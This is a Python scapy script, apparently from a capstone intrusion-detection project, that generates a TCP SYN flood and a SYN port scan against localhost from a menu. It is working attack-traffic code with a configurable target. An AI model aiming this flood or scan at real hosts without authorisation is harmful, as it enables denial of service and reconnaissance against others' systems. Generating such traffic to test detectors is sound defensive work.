import sys
import time
import random
from scapy.all import IP, TCP, UDP, send, conf

TARGET_IP = "127.0.0.1"  # Localhost target for safe testing

def syn_flood(target_ip=TARGET_IP, packet_count=300):
    """Simulates a TCP SYN flood attack by sending rapid SYN packets from randomized ports."""
    print(f"\n[!] 🚨 Launching TCP SYN Flood Simulation against {target_ip} ({packet_count} packets)...")
    for _ in range(packet_count):
        src_port = random.randint(1024, 65535)
        dst_port = random.choice([80, 443, 8080, 22])
        # Construct SYN packet
        pkt = IP(dst=target_ip)/TCP(sport=src_port, dport=dst_port, flags="S")
        send(pkt, verbose=False)
    print("[✓] SYN Flood simulation completed.")

def port_scan(target_ip=TARGET_IP, port_range=(20, 100)):
    """Simulates a rapid port scan across a range of destination ports."""
    start_port, end_port = port_range
    print(f"\n[!] 🔍 Launching Port Scan Simulation against {target_ip} (Ports {start_port}-{end_port})...")
    for port in range(start_port, end_port + 1):
        src_port = random.randint(1024, 65535)
        pkt = IP(dst=target_ip)/TCP(sport=src_port, dport=port, flags="S")
        send(pkt, verbose=False)
        time.sleep(0.01)  # Small delay between probes
    print("[✓] Port Scan simulation completed.")

def main():
    print("=" * 65)
    print("      Capstone IDS — Attack Traffic Simulator (Local Test)      ")
    print("=" * 65)
    print("Select an attack simulation option:")
    print("  1. TCP SYN Flood (DoS Attack Simulation)")
    print("  2. Port Scan (Reconnaissance Simulation)")
    print("  3. Run Both Attacks Sequentially")
    print("  4. Exit")
    print("=" * 65)

    choice = input("Enter choice (1-4): ").strip()

    if choice == "1":
        syn_flood()
    elif choice == "2":
        port_scan()
    elif choice == "3":
        syn_flood()
        time.sleep(2)
        port_scan()
    elif choice == "4":
        print("Exiting simulator.")
        sys.exit(0)
    else:
        print("[!] Invalid choice.")

if __name__ == "__main__":
    main()